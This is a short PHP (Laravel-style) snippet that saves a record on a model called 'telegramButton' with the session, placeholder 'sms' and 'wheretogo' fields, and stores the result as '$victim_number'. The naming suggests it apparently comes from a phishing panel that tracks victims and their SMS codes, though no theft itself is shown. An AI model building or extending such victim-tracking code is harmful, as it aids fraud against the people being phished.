...
$victim_db = new telegramButton;
$victim_db->session = \request()->session()->get("session");
$victim_db->sms = "idk";
$victim_db->wheretogo = "idk";
$victim_db->save();
$victim_number = $victim_db->id;
